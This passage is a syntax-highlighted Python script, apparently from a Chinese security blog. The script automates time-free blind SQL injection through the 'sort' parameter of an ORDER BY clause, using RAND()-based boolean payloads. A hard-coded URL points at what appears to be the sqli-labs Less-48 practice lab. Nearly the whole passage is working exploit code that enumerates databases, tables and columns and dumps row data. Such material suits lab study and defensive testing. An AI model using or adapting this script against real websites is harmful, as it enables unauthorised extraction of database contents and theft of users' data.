class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbasehtml</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    basehtml = requests.get(url, headers=headers).content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> basehtml</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, basehtml, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).content</span><br><span class=\"line\">            <span class=\"keyword\">if</span> basehtml == html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, basehtml, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    print(lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\">    basehtml = requests.get(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.250.239/sql/Less-48/?sort=RAND(true)'</span>, headers=headers).content</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).content</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (basehtml == html):</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d)\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url, basehtml)</span><br><span class=\"line\">    lenth = get_all_db_len(url, basehtml, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, basehtml, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, basehtml, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, basehtml, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, basehtml, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, basehtml, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, basehtml, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span 